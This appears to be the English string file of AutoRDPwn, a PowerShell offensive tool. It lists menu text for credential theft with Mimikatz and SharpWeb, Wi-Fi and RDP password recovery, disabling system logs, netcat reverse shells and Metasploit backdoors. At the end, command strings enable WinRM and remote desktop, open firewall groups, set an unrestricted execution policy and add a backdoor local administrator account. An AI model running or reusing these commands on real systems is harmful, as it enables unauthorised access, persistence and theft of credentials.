﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")

$txt1  = "Load additional modules"
$txt2  = "Close the program"
$txt3  = "Your version of Powershell is not compatible with this script :("
$txt4  = "You can download the latest version here"
$txt5  = "Your operating system is not compatible with this attack"
$txt6  = "Incorrect option, try again"
$txt7  = "Choose how you want to launch the attack:` "
$txt8  = "Choose the module you want to load:` "
$txt9  = "Extract local hashes with Mimikatz"
$txt10 = "Extract system passwords with Mimikatz"
$txt11 = "Rebuild the image cache"
$txt12 = "Retrieve remote desktop history"
$txt13 = "$system system detected, downloading Mimikatz.."
$txt14 = "Redirect a local port"
$txt15 = "Redirect a remote port"
$txt16 = "Check actual redirections"
$txt17 = "Remote Access"
$txt18 = "Deactivate system logs"
$txt19 = "This process can take several minutes.."
$txt20 = "Delete all redirections"
$txt21 = "Module loaded successfully!"
$txt22 = "Return to the main menu"
$txt23 = "What is the IP of the server?:` "
$txt24 = "And the user?:` "
$txt25 = "Enter the password:` "
$txt26 = "Enter the domain:` "
$txt27 = "Finally, the NTLM hash:` "
$txt28 = "Elevating privileges with token duplication.."
$txt29 = "Do you want to see or control the computer?:` "
$txt30 = "Modifying permissions to view the remote computer.."
$txt31 = "Modifying permissions to control the remote computer.."
$txt32 = "Changes in the Windows registry made successfully!"
$txt33 = "Detecting operating system version on` "
$txt34 = "Modifying permissions to enter without credentials.."
$txt35 = "Looking for active sessions on the computer.."
$txt36 = "What session do you want to connect to?:` "
$txt37 = "detected, applying changes.."
$txt38 = "Starting remote connection!"
$txt39 = "Semi-interactive console (WinRS)"
$txt40 = "Something went wrong, closing the program.."
$txt41 = "Enter the local port:` "
$txt42 = "Which interface do you want to use?:` "
$txt43 = "Enter the remote port:` "
$txt44 = "Finally, the destination IP:` "
$txt45 = "Redirection created successfuly!"
$txt46 = "Configuration saved successfully!"
$txt47 = "There is no redirection to show"
$txt48 = "All redirects have been deleted"
$txt49 = "Obtain browsers passwords with SharpWeb"
$txt50 = "Passwords and hashes"
$txt51 = "Netcat console (direct connection)"
$txt52 = "Netcat console (reverse connection)"
$txt53 = "Enter the port to listen to:` "
$txt54 = "Enter the remote IP:` "
$txt55 = "Enter the IP or network range:` "
$txt56 = "Enter the scanning speed (1-5):` "
$txt57 = "Enter the number of ports to scan (25-1000):` "
$txt58 = "All User Profile"
$txt59 = "Recover Wi-Fi passwords"
$txt60 = "There is no wireless network on this computer"
$txt61 = "Retrieve RDP session credentials"
$txt62 = "Remote VNC Server (legacy)"
$txt63 = "Paste in your Metasploit Framework Console:` "
$txt64 = "Backdoors and persistence"
$txt65 = "Enter the IP where MSF is running:` "
$txt66 = "All ready! Now execute the following command:` "
$txt67 = "External script execution"
$txt68 = "Privilege escalation"
$txt69 = "Other modules"
$txt70 = "Get operating system information"
$txt71 = "Search vulnerabilities with Sherlock"
$txt72 = "Privilege escalation with PowerUp"
$txt73 = "Enter the path or url of the script:` "
$txt74 = "Write the function you want to execute:` "
$txt75 = "Waiting for closing all processes.."
$txt76 = "Cleaning done!"
$txt77 = "Undoing changes on the remote computer.."
$txt78 = "Enter the username:` "
$txt79 = "Change user with RunAs"
$txt80 = "Checking credentials on the local computer.."
$txt81 = "Wrong credentials! Returning to the main menu.."
$txt82 = "Loading AutoRDPwn with the new user.."
$txt83 = "Select the verification method (Hash / Password):` "
$txt84 = "Enter the NTLM Hash:` "
$txt85 = "Enter the protocol you want to use (SMB / WMI):` "
$Pwn1  = "Set-NetConnectionProfile -InterfaceIndex ((Get-NetConnectionProfile).interfaceindex) -NetworkCategory Private ; winrm quickconfig -force ; Enable-PSRemoting -Force"
$Pwn2  = "Set-NetFirewallRule -DisplayGroup 'Remote Assistance' -Enabled True ; Set-NetFirewallRule -DisplayGroup 'Remote Desktop' -Enabled True ; Set-ExecutionPolicy Unrestricted -Force"
$Pwn3  = "Set-NetFirewallRule -DisplayGroup 'Network Discovery' -Enabled True ; Set-NetFirewallRule -DisplayGroup 'Remote Scheduled Tasks Management' -Enabled True"
$Pwn4  = "Set-NetFirewallRule -DisplayGroup 'Windows Management Instrumentation (WMI)' -Enabled True ; Set-NetFirewallRule -DisplayGroup 'Windows Remote Management' -Enabled True"
$Pwn5  = "net user AutoRDPwn AutoRDPwn /add ; net localgroup Administrators AutoRDPwn /add"
$Pwn6  = "RDP session agent"
